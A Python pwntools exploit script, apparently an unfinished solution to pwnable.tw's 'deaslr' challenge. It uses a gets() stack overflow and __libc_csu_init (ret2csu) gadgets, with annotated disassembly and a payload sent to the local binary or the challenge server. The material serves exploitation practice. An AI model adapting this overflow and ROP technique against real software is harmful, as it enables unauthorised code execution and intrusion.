#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("deaslr_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

local = True 
if local:
    p = process("./deaslr_patched")
    gdb.attach(p,'''b*main+31\nc''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./deaslr_patched', checksec=False)
scu_rbx = 0x40057a
'''0x000000000040057a <+26>:    push   rbx
   0x000000000040057b <+27>:    mov    r14,rsi
   0x000000000040057e <+30>:    mov    r13,rdx
   0x0000000000400581 <+33>:    xor    ebx,ebx
   0x0000000000400583 <+35>:    sub    rbp,r12
   0x0000000000400586 <+38>:    sub    rsp,0x8
   0x000000000040058a <+42>:    sar    rbp,0x3
   0x000000000040058e <+46>:    call   0x4003e0 <_init>
   0x0000000000400593 <+51>:    test   rbp,rbp
   0x0000000000400596 <+54>:    je     0x4005b6 <__libc_csu_init+86>
   0x0000000000400598 <+56>:    nop    DWORD PTR [rax+rax*1+0x0]
   '''

scu_call = 0x4005a0
'''
   0x00000000004005a0 <+64>:    mov    rdx,r13
   0x00000000004005a3 <+67>:    mov    rsi,r14
   0x00000000004005a6 <+70>:    mov    edi,r15d
   0x00000000004005a9 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x00000000004005ad <+77>:    add    rbx,0x1
   0x00000000004005b1 <+81>:    cmp    rbx,rbp
   0x00000000004005b4 <+84>:    jne    0x4005a0 <__libc_csu_init+64>
   '''

scu_pop = 0x4005b6
'''
   0x00000000004005b6 <+86>:    add    rsp,0x8
   0x00000000004005ba <+90>:    pop    rbx
   0x00000000004005bb <+91>:    pop    rbp
   0x00000000004005bc <+92>:    pop    r12
   0x00000000004005be <+94>:    pop    r13
   0x00000000004005c0 <+96>:    pop    r14
   0x00000000004005c2 <+98>:    pop    r15
   0x00000000004005c4 <+100>:   ret
   '''

def exploit(r12, r13, r14, r15, ret):
    exp  = p64(0) + p64(0) + p64(1)
    exp += p64(r12)         #call r12
    exp += p64(r13)         #mov rdx
    exp += p64(r14)         #mov rsi
    exp += p64(r15)         #mov edi
    exp += p64(ret)
    return exp

'''
   0x0000000000400536 <+0>:     push   rbp
   0x0000000000400537 <+1>:     mov    rbp,rsp
   0x000000000040053a <+4>:     sub    rsp,0x10
   0x000000000040053e <+8>:     lea    rax,[rbp-0x10]
   0x0000000000400542 <+12>:    mov    rdi,rax
   0x0000000000400545 <+15>:    mov    eax,0x0
   0x000000000040054a <+20>:    call   0x400430 <gets@plt>
   0x000000000040054f <+25>:    mov    eax,0x0
   0x0000000000400554 <+30>:    leave
   0x0000000000400555 <+31>:    ret
'''

add_ebx_esi = 0x0000000000400509
main = 0x0000000000400536
payload = cyclic(0x10) + p64(0x601040)
payload += p64(0x000000000040057a)
p.sendline(payload)
p.interactive()